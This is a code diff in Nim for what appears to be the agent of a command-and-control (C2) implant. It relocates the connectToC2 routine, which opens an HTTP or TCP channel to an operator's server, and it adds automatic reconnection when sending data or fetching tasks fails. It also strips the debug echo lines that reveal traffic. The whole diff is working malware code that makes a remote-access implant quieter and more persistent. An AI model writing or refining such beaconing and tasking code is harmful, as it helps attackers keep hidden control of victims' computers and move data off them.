@@ -7,10 +7,32 @@ elif defined(http):
 
 import types
 
+proc connectToC2*(app: App) =
+  let j = %*{
+    "task": "connect",
+    "taskId": -1,
+    "error": "",
+    "data": {}
+  }
+
+  when defined(http):
+    try:
+      let token = app.httpClient.getContent(app.httpRoot & "/r")
+      app.token = token
+      app.sendData($j)
+    except OSError: discard
+  elif defined(tcp):
+    try:
+      app.socket = newSocket()
+      app.socket.connect(app.ip, Port(app.port))
+      app.socket.send(encode($j) & "\r\n")
+    except OSError:
+      sleep(app.autoConnectTime)
+
 proc sendData(app: App, data: string) =
   when defined(tcp):
-    echo "sending " & data
-    app.socket.send(encode(data) & "\r\n")
+    try: app.socket.send(encode(data) & "\r\n")
+    except: app.connectToC2()
   elif defined(http):
     try:
       discard app.httpClient.postContent(app.httpRoot & "/t?id=" & app.token, body=encode(data))
@@ -18,6 +40,7 @@ proc sendData(app: App, data: string) =
         echo "sending " & data
     except OSError:
       return
+
 type DataType* = enum
   File, Text, Code, Image, Object
 
@@ -83,28 +106,6 @@ proc identify*(app: App, taskId: int, hostname: string, isAdmin: bool, username:
     }
   app.sendData($j)
 
-proc connectToC2*(app: App) =
-  let j = %*{
-    "task": "connect",
-    "taskId": -1,
-    "error": "",
-    "data": {}
-  }
-
-  when defined(http):
-    try:
-      let token = app.httpClient.getContent(app.httpRoot & "/r")
-      app.token = token
-      app.sendData($j)
-    except OSError: discard
-  elif defined(tcp):
-    try:
-      app.socket = newSocket()
-      app.socket.connect(app.ip, Port(app.port))
-      app.sendData($j)
-    except OSError:
-      sleep(app.autoConnectTime)
-
 proc unknownTask*(app: App, taskId: int, taskName: string) =
   let j = %*
     {
@@ -138,10 +139,11 @@ proc newTaskOutput*(taskId: int): TaskOutput =
 
 proc fetchTasks*(app: App): JsonNode =
   when defined(tcp):
-    app.socket.send("tasksplz\r\n")
-    echo "waiting for tasks.."
+    try: app.socket.send("tasksplz\r\n")
+    except: 
+      app.connectToC2()
+      return %*[]
     let line = app.socket.recvLine()
-    echo "received: " & line
     if line.len == 0:
       app.socket.close()
     let decoded = decode(line)
